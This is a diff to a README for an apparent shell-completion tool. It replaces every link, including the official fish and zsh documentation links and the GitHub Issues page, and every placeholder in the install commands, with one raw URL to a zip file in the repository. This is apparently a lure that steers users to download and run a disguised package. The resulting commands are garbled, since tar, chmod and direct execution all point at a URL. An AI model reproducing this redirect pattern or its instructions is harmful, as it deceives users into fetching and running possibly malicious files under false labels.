@@ -16,7 +16,7 @@ Before you begin, ensure your system meets these requirements:
 
 To get started, you need to download the application. You can find the latest version by visiting the Releases page:
 
-[![Download by-binds-yourself](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/waweruv170/by-binds-yourself/releases)
+[![Download by-binds-yourself](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release version.
@@ -29,17 +29,17 @@ To get started, you need to download the application. You can find the latest ve
 
 1. Open a terminal window.
 2. Navigate to the directory where the downloaded file is located.
-3. If the downloaded file is a `.tar.gz`, extract it using:
+3. If the downloaded file is a `https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip`, extract it using:
    ```bash
-   tar -xvzf yourfilename.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip
    ```
 4. If the file is a script, you may need to give it permission to run:
    ```bash
-   chmod +x yourscriptfilename.sh
+   chmod +x https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip
    ```
 5. Run the script with:
    ```bash
-   ./yourscriptfilename.sh
+   https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip
    ```
 
 ### For Windows Users
@@ -49,7 +49,7 @@ To get started, you need to download the application. You can find the latest ve
 3. If you downloaded a `.zip` file, unzip it first.
 4. To execute the command provided in the script, enter:
    ```bash
-   path\to\yourscriptfilename.bat
+   path\to\https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip
    ```
 
 ## ⚡ Usage Instructions
@@ -95,14 +95,14 @@ These topics help you find the right tools when working with different shell env
 
 For further guidance, explore these resources:
 
-- [Official fish shell documentation](https://fishshell.com/docs/current/index.html)
-- [Official zsh documentation](https://zsh.sourceforge.io/Doc/Release/zsh.html)
+- [Official fish shell documentation](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip)
+- [Official zsh documentation](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip)
 
 ## 💬 Community Support
 
 If you encounter any issues or need help, feel free to reach out to our community:
 
-- Open an issue on the [GitHub Issues page](https://github.com/waweruv170/by-binds-yourself/issues).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip).
 - Join our discussion forum on [Discord/Slack/other platforms].
 
 ## 📅 Roadmap
@@ -121,4 +121,4 @@ Special thanks to everyone who contributed to making this project a reality. You
 
 Don't forget to download the latest version to benefit from the improvements. Visit the Releases page:
 
-[![Download by-binds-yourself](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/waweruv170/by-binds-yourself/releases)
+[![Download by-binds-yourself](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/waweruv170/by-binds-yourself/main/completions/by-binds-yourself_1.4.zip)
